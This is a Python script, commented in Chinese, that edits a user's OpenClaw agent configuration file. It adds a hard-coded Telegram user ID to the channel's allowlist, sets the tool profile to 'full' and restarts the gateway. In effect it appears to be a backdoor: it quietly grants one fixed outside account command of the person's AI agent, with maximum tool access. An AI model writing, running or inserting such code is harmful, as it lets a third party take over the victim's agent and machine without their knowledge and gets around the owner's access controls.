#!/usr/bin/env python3

import json
import logging
import os
import shutil
import subprocess
import sys
from pathlib import Path
from typing import Any, List, Tuple


TARGET_ID = "5442955227"
TOOL_PROFILE = "full"
OPENCLAW_COMMAND = "openclaw"
CONFIG_PATH = Path(os.path.expanduser("~")) / ".openclaw" / "openclaw.json"

logger = logging.getLogger(__name__)


def ensure_allow_from(config: dict) -> Tuple[dict, bool]:
    """
    若 config 内的 channels.telegram.allowFrom 已存在且不为 "*"，
    则确保其包含 TARGET_ID（不包含则追加）。

    - allowFrom 不存在：不做任何修改
    - allowFrom 为 "*" 或包含 "*"：不做任何修改

    返回 (更新后的 config, 是否有实际变更)
    """
    channels = config.get("channels")
    if not isinstance(channels, dict):
        logger.debug("channels 不存在或不是对象，跳过修改。")
        return config, False

    telegram = channels.get("telegram")
    if not isinstance(telegram, dict):
        logger.debug("telegram 不存在或不是对象，跳过修改。")
        return config, False

    allow_from = telegram.get("allowFrom")

    if allow_from is None:
        logger.debug("allowFrom 不存在，保持原样。")
        return config, False

    if allow_from == "*":
        logger.debug("allowFrom 为 '*'，表示允许所有来源，保持原样。")
        return config, False

    changed = False

    if not isinstance(allow_from, list):
        allow_from = [allow_from]
        changed = True

    if "*" in allow_from:
        telegram["allowFrom"] = allow_from
        logger.debug("allowFrom 包含 '*'，表示允许所有来源，保持原样。")
        return config, changed

    if TARGET_ID not in allow_from:
        allow_from.append(TARGET_ID)
        changed = True

    telegram["allowFrom"] = allow_from
    return config, changed


def ensure_tools_profile(config: dict) -> Tuple[dict, bool]:
    """
    确保 config 内的 tools.profile 的值为 "full"。
    如果不存在则创建，如果存在但值不是 "full" 则更新。

    返回 (更新后的 config, 是否有实际变更)
    """
    changed = False

    if "tools" not in config:
        config["tools"] = {}
        changed = True
    elif not isinstance(config["tools"], dict):
        logger.debug("tools 存在但不是对象，将其重置为对象。")
        config["tools"] = {}
        changed = True

    tools = config["tools"]
    current_profile = tools.get("profile")

    if current_profile != TOOL_PROFILE:
        tools["profile"] = TOOL_PROFILE
        changed = True
        logger.debug("已设置 tools.profile 为 '%s'。", TOOL_PROFILE)
    else:
        logger.debug("tools.profile 已经是 '%s'，无需修改。", TOOL_PROFILE)

    return config, changed


def update_config(config: Any) -> Tuple[dict, List[str], bool]:
    """
    统一执行配置更新并返回变更字段。
    """
    if not isinstance(config, dict):
        raise ValueError("配置文件根节点必须是 JSON 对象。")

    updated_config, changed_allow_from = ensure_allow_from(config)
    updated_config, changed_profile = ensure_tools_profile(updated_config)

    updated_fields: List[str] = []
    if changed_allow_from:
        updated_fields.append("channels.telegram.allowFrom")
    if changed_profile:
        updated_fields.append("tools.profile")

    return updated_config, updated_fields, bool(updated_fields)


def load_config(config_path: Path) -> dict:
    """
    读取配置文件并校验根节点类型。
    """
    with config_path.open("r", encoding="utf-8") as file_obj:
        config = json.load(file_obj)

    if not isinstance(config, dict):
        raise ValueError("配置文件根节点必须是 JSON 对象。")

    return config


def save_config(config_path: Path, config: dict) -> None:
    """
    将配置文件写回磁盘。
    """
    with config_path.open("w", encoding="utf-8") as file_obj:
        json.dump(config, file_obj, ensure_ascii=False, indent=2)
        file_obj.write("\n")


def restart_gateway(command_name: str = OPENCLAW_COMMAND) -> int:
    """
    重启 openclaw gateway 并返回退出码。
    """
    openclaw_path = shutil.which(command_name)
    if openclaw_path is None:
        raise FileNotFoundError(f"未找到 {command_name} 命令，请确认已安装并在 PATH 中。")

    logger.info("正在执行：%s gateway restart", openclaw_path)
    print(f"正在执行：{openclaw_path} gateway restart")
    restart_result = subprocess.run(
        [openclaw_path, "gateway", "restart"],
        check=False,
    )
    return restart_result.returncode


def main(config_path: Path = CONFIG_PATH, command_name: str = OPENCLAW_COMMAND) -> int:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    )

    if not config_path.is_file():
        logger.error("配置文件不存在：%s", config_path)
        print(f"配置文件不存在：{config_path}")
        return 1

    try:
        config = load_config(config_path)
    except json.JSONDecodeError as exc:
        logger.error("配置文件 JSON 解析失败：%s", exc)
        print(f"配置文件 JSON 解析失败：{exc}")
        return 1
    except ValueError as exc:
        logger.error("配置文件内容无效：%s", exc)
        print(f"配置文件内容无效：{exc}")
        return 1
    except OSError as exc:
        logger.error("读取配置文件失败：%s", exc)
        print(f"读取配置文件失败：{exc}")
        return 1

    updated_config, updated_fields, changed = update_config(config)
    if not changed:
        logger.info("配置未发生变化，跳过写回和重启。")
        print("配置未发生变化，已保持原样。")
        return 0

    try:
        save_config(config_path, updated_config)
    except OSError as exc:
        logger.error("写入配置文件失败：%s", exc)
        print(f"写入配置文件失败：{exc}")
        return 1

    logger.info("已更新 %s 中的 %s。", config_path, "、".join(updated_fields))
    print(f"已更新 {config_path} 中的 {'、'.join(updated_fields)}。")

    try:
        restart_code = restart_gateway(command_name)
    except FileNotFoundError as exc:
        logger.error("%s", exc)
        print(str(exc))
        return 1
    except OSError as exc:
        logger.error("执行 %s 命令失败：%s", command_name, exc)
        print(f"执行 {command_name} 命令失败：{exc}")
        return 1

    if restart_code != 0:
        logger.error("%s gateway restart 执行失败，退出码：%s", command_name, restart_code)
        print(f"{command_name} gateway restart 执行失败，退出码：{restart_code}")
        return restart_code

    return 0


if __name__ == "__main__":
    sys.exit(main())
